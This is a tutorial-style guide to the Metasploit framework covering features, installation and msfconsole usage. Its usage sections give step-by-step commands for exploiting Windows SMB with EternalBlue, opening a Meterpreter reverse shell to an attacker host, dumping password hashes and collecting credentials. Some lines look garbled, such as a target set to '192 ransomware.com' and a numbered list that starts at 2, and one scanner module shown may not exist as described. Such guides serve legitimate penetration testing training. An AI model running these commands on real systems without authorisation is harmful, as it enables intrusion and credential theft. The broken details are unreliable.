## About Metasploit

Metasploit is an open-source penetration testing framework developed by H.D. Moore in 2003 and maintained by Rapid7 since its acquisition in 2009. It is a powerful tool for simulating real-world cyberattacks, allowing security professionals to identify, exploit, and validate vulnerabilities in systems, networks, and applications. Metasploit Framework, the open-source version, is complemented by commercial editions (Metasploit Pro and Express) that offer advanced features like automated reporting and web interfaces. With over 2,000 exploits, 1,100 auxiliary modules, and 400 payloads, Metasploit supports testing across platforms, including Windows, Linux, macOS, and web applications. It integrates with other security tools and is widely used for penetration testing, red teaming, and vulnerability verification, aligning with frameworks like MITRE ATT&CK.

### Key Objectives
- **Vulnerability Exploitation**: Test systems by exploiting known vulnerabilities to assess security posture.
- **Penetration Testing**: Simulate adversarial attacks to identify weaknesses before exploitation by malicious actors.
- **Automation and Scalability**: Streamline testing with automated exploits and scalable workflows.
- **Extensibility**: Allow custom module development and integration with other tools.
- **Training and Validation**: Support security training and vulnerability verification for compliance and audits.

## Features

Metasploit offers a comprehensive set of features for penetration testing and security research:

1. **Exploit Modules**:
   - Over 2,000 exploits for known vulnerabilities (e.g., CVEs for Windows, Linux, web apps).
   - Covers network services, client-side applications, and remote code execution vulnerabilities.

2. **Payloads**:
   - Over 400 payloads, including Meterpreter (an advanced, in-memory payload), bind/reverse shells, and staged payloads.
   - Supports single, staged, and Meterpreter payloads for flexibility.

3. **Auxiliary Modules**:
   - Over 1,100 modules for scanning, fuzzing, sniffing, and brute-forcing.
   - Examples: Port scanning, credential harvesting, and denial-of-service testing.

4. **Post-Exploitation Modules**:
   - Modules for privilege escalation, credential dumping, persistence, and lateral movement.
   - Integrates with tools like Mimikatz for advanced post-exploitation tasks.

5. **Meterpreter**:
   - A dynamic, in-memory payload for command execution, file manipulation, keylogging, and network pivoting.
   - Supports scripting for custom post-exploitation tasks.

6. **Command-Line Interface (msfconsole)**:
   - Interactive console for managing exploits, payloads, and sessions.
   - Supports scripting with Ruby for automation.

7. **Database Integration**:
   - Stores scan results, credentials, and host data in a PostgreSQL database.
   - Enhances workflow with commands like `db_nmap` and `hosts`.

8. **Web Interface (Pro)**:
   - Metasploit Pro offers a browser-based interface for managing scans, reports, and team collaboration.
   - Includes automated workflows and task chains.

9. **Integration with Other Tools**:
   - Works with Nmap, Nessus, Burp Suite, and Wazuh for comprehensive testing.
   - Supports importing scan results from other tools.

10. **Reporting**:
    - Generates reports in HTML, PDF, XML, and CSV formats.
    - Includes vulnerability details, exploited hosts, and remediation steps.

11. **Community and Extensibility**:
    - Open-source framework with community-contributed modules.
    - Supports custom module development in Ruby.

12. **MITRE ATT&CK Mapping**:
    - Aligns exploits and techniques with ATT&CK TTPs for standardized testing.

## Installation

This guide covers installing Metasploit Framework 6.4.22 on Ubuntu 22.04, the recommended platform for ease of setup. It is also pre-installed on Kali Linux.

### Prerequisites
- **Operating System**: Ubuntu 22.04 or Kali Linux 2025.1.
- **Hardware**: Minimum 4 GB RAM, 2 CPU cores (2 GHz+), 20 GB disk space.
- **Dependencies**: `curl`, `git`, `ruby`, `postgresql`, `nmap`, `libpq-dev`, `libpcap-dev`.
- **Network**: Open ports for target scanning (varies by exploit), 5432 (PostgreSQL).

### Installation Steps (Ubuntu 22.04)
1. **Update System and Install Dependencies**:
   ```bash
   sudo apt update && sudo apt upgrade -y
   sudo apt install -y curl git ruby-full postgresql libpq-dev libpcap-dev nmap
   ```

2. **Set Up PostgreSQL**:
   ```bash
   sudo systemctl start postgresql
   sudo systemctl enable postgresql
   sudo -u postgres createuser msfuser
   sudo -u postgres createdb -O msfuser msf
   ```

3. **Install Metasploit Framework**:
   ```bash
   curl https://raw.githubusercontent.com/rapid7/metasploit-framework/6.4.22/scripts/install.sh | sudo bash
   ```
   - This installs Metasploit to `/opt/metasploit-framework`.

4. **Configure Database**:
   - Create `/opt/metasploit-framework/config/database.yml`:
     ```yaml
     production:
       adapter: postgresql
       database: msf
       username: msfuser
       password: 
       host: localhost
       port: 5432
       pool: 5
       timeout: 5
     ```
   - Initialize the database:
     ```bash
     msfdb init
     ```

5. **Start msfconsole**:
   ```bash
   /opt/metasploit-framework/bin/msfconsole
   ```
   - Verify database connection: `db_status` (should show `connected to msf`).

6. **Update Metasploit**:
   ```bash
   msfupdate
   ```

### Kali Linux
- Metasploit is pre-installed. Update to 6.4.22:
  ```bash
  sudo apt update && sudo apt install -y metasploit-framework
  msfupdate
  ```

### Notes
- **Docker Alternative**: Use Rapid7’s Docker image:
  ```bash
  docker pull metasploitframework/metasploit-framework
  docker run -it -p 4444:4444 metasploitframework/metasploit-framework
  ```
- **Windows/macOS**: Download the installer from [https://www.metasploit.com/download](https://www.metasploit.com/download).
- **Security**: Run Metasploit as a non-root user to avoid privilege issues.

## Usage

Metasploit operates primarily through the `msfconsole` command-line interface, with additional web-based options in Pro. Below is a step-by-step guide for common use cases.

### Basic Workflow
1. **Start msfconsole**:
   ```bash
   msfconsole
   ```

2. **Scan for Targets**:
   - Use `db_nmap` to discover hosts:
     ```bash
     db_nmap -sV 192.168.1.0/24
     ```
   - View hosts:
     ```bash
     hosts
     ```

3. **Select an Exploit**:
   - Search for an exploit (e.g., for EternalBlue):
     ```bash
     search eternalblue
     ```
   - Use the exploit:
     ```bash
     use exploit/windows/smb/ms17_010_eternalblue
     ```

4. **Configure Exploit**:
   - Set target IP and other options:
     ```bash
     set RHOSTS 192.168.1.100
     set PAYLOAD windows/x64/meterpreter/reverse_tcp
     set LHOST 192.168.1.50
     set LPORT 4444
     ```

5. **Run the Exploit**:
   - Check compatibility:
     ```bash
     check
     ```
   - Execute:
     ```bash
     exploit
     ```

6. **Interact with Session**:
   - If successful, interact with the Meterpreter session:
     ```bash
     sessions -i 1
     meterpreter > getuid
     meterpreter > shell
     ```

7. **Post-Exploitation**:
   - Run a post-exploitation module:
     ```bash
     use post/windows/gather/credentials/credential_collector
     set SESSION 1
     run
     ```

8. **Generate Report**:
   - Export results:
     ```bash
     services -o /tmp/services.csv
     creds -o /tmp/creds.csv
     ```

### Metasploit Pro (Optional)
- Access the web interface at `http://localhost:3790` after starting:
  ```bash
  msfpro
  ```
- Use automated workflows for scanning, exploitation, and reporting.

## Example Usage

### Scenario: Exploiting a Windows SMB Vulnerability
1. **Discover Targets**:
   ```bash
   msf6 > db_nmap -sV ip
   ```

2. **Select Exploit**:
   ```bash
   msf6 > search ms17_010
   msf6 > use exploit/windows/smb/ms17_010_eternalblue
   ```

3. **Configure Options**:
   ```bash
   msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS ip
   msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
   msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST eth0
   msf6 exploit(windows/smb/ms17_010_eternalblue) > set LPORT 4444
   ```

4. **Run Exploit**:
   ```bash
   msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
   ```

5. **Interact with Meterpreter**:
   ```bash
   meterpreter > sysinfo
   meterpreter > getuid
   meterpreter > hashdump
   ```

6. **Report Findings**:
   - Save credentials:
     ```bash
     msf6 > creds -o /tmp/exploit_creds.csv
     ```

### Scenario: Web Application Testing
1. **Scan for Web Vulnerabilities**:
   ```bash
   msf6 > use auxiliary/scanner/http/dir_scanner
   msf6 auxiliary(scanner/http/dir_scanner) > set RHOSTS ip
   msf6 auxiliary(scanner/http/dir_scanner) > set THREADS 10
   msf6 auxiliary(scanner/http/dir_scanner) > run
   ```

2. **Exploit SQL Injection**:
   ```bash
   msf6 > use auxiliary/scanner/http/sqlmap
   msf6 auxiliary(scanner/http/sqlmap) > set RHOSTS 192 ransomware.com
   msf6 auxiliary(scanner/http/sqlmap) > set TARGETURI /login
   msf6 auxiliary(scanner/http/sqlmap) > run
   ```

3. **Generate Report**:
   ```bash
   msf6 > vulns -o /tmp/web_vulns.xml
   ```

## Important Links
- **Official Website**: [https://www.metasploit.com](https://www.metasploit.com)
- **Documentation**: [https://docs.metasploit.com](https://docs.metasploit.com)
- **GitHub Repository**: [https://github.com/rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework)
- **Community Forum**: [https://community.rapid7.com](https://community.rapid7.com)
- **Metasploit Unleashed**: [https://www.offensive-security.com/metasploit-unleashed/](https://www.offensive-security.com/metasploit-unleashed/)
- **Download**: [https://www.metasploit.com/download](https://www.metasploit.com/download)
- **Support**: [https://www.rapid7.com/support](https://www.rapid7.com/support)

## Alternative Tools

2. **MITRE Caldera**:
   - Adversary emulation platform for automated TTP testing.
   - Pros: ATT&CK-aligned, open-source.
   - Cons: Focused on emulation, not exploitation.
   - Link: [https://caldera.mitre.org](https://caldera.mitre.org)

3. **Empire**:
   - Post-exploitation C2 framework.
   - Pros: Robust post-exploitation, cross-platform.
   - Cons: Less focus on initial exploitation.
   - Link: [https://github.com/BC-SECURITY/Empire](https://github.com/BC-SECURITY/Empire)

4. **Cobalt Strike**:
   - Commercial C2 framework for red teaming.
   - Pros: Advanced evasion, professional support.
   - Cons: High cost, not open-source.
   - Link: [https://www.cobaltstrike.com](https://www.cobaltstrike.com)


